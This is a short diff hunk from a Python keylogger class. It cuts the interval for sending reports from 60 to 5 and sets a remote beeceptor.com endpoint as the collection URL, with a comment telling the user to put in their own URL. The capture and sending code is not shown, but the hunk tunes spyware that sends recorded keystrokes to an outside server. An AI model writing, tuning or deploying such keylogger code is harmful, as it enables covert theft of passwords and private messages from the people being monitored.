@@ -5,7 +5,7 @@ from datetime import datetime
 
 
 
-SEND_REPORT_EVERY = 60
+SEND_REPORT_EVERY = 5
 URL = "https://sphyni.free.beeceptor.com"  # Update this with your actual URL
 
 class Keylogger:
